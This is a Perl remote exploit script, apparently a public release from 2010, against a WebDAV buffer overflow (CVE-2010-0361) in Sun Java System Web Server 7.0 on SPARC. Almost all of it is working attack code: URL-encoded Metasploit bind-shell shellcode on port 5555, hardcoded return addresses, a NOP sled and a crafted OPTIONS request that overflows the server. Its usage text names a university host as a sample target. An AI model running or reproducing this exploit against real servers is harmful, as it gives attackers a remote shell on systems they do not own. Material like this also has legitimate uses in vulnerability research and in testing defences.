#!/usr/bin/perl
# aN0THER TiP OF THE iCE-B3RG ReMOTE eXPLoiT
# //Sun Microsystems Sun Java System Web Server
# //*Broken One Target Remote Exploit for Sparc*
# //by Kingcope and lsd
# //Bug Found by immunity/gleg CVE-2010-0361
# May/2010
#
# **WORKS ONLY ON [ ADD YOUR TARGETS AS YOU WiSH KTHX ] **
# SunOS unknown 5.10 Generic_141444-09 sun4u sparc SUNW,Sun-Blade-1500
# Sun Java System Web Server 7.0 B12/04/2006
# Should give you uid=80(webservd) gid=80(webservd)
# RoCKiNG tHA SuRFACE SiNCE 2003 kTHX

use IO::Socket;

# solaris_sparc_bind -  LPORT=5555 http://metasploit.com
my $payloadS =
"%23%32%de%d7%a2%14%62%6f%20%bf%ff%ff%20%bf%ff%ff".
"%7f%ff%ff%ff%ea%03%e0%20%aa%9d%40%11%ea%23%e0%20".
"%a2%04%40%15%81%db%e0%20%12%bf%ff%fb%9e%03%e0%04".
"%57%50%fe%68%ff%b6%de%77%69%ad%de%7c%01%cb%1e%89".
"%bb%fc%be%8f%2b%ec%9e%8d%ce%1c%fe%77%5f%cc%df%7f".
"%8f%ce%a0%87%11%10%df%f2%f1%04%fe%4f%11%06%be%5f".
"%11%6b%7e%6b%03%4f%21%83%b7%80%01%b3%35%b0%61%5b".
"%a8%60%42%93%1b%83%3d%5b%09%94%62%9a%af%84%42%75".
"%3e%74%a3%8d%91%77%1c%75%83%62%23%8c%37%80%e3%87".
"%b5%b4%c3%7d%28%65%24%89%9b%a6%9b%71%8f%b8%c4%82".
"%3d%a9%24%8d%d5%6b%84%8c%54%7b%e4%b0%c9%ab%c4%c4".
"%f8%f3%fb%28%2d%0f%bb%28%59%15%04%c3%40%21%5c%49".
"%22%22%7c%03%01%41%a2%01%d5%75%fb%a5%47%5a%5b%cd".
"%87%a6%24%3d%97%fa%e4%45%d7%de%a4%49%5a%30%fb%8a".
"%cb%e0%db%e4%ec%01%1b%f4";

$|=1;

print "//Sun Microsystems Sun Java System Web Server\n";
print "//Remote Exploit for Sparc\n";
print "//by Kingcope and lsd\n";
print "May/2010\n";

if ($#ARGV != 2) {
        print "usage: perl sunone.pl <target> <webdav directory> <webserver
domainname>\n";
        print "sample: perl sunone.pl lib7.berkeley.edu /dav unknown\n";
        exit;
}

$target = $ARGV[0];
$wd = $ARGV[1];
$dm = $ARGV[2]; # domainname

$sock = IO::Socket::INET->new(PeerAddr => $target,
                              PeerPort => '80',
                              Proto    => 'tcp');

$patch = pack("N", 0xf68782e0);
$ret = pack("N", 0xe23ef7f0); #
#$ret = pack("N", 0xf882f7fa); # u4
$nops = $ret . "%90" x 32;
$payloadS = $nops . $payloadS;
$v = ("V" x (313 - length($wd) - length($dm))) .
        "AAAABBB". $patch
."CDDDD".$patch."FFFF".$patch.$patch."IIIIJJJJJKKK".$patch.$patch.$patch.$patch."AAAA".$patch.$ret.$patch.$payloadS;

print $sock "OPTIONS /$wd/AA$v HTTP/1.1\r\nHost: $target\r\n\r\n";

while(<$sock>) {
        print;  
}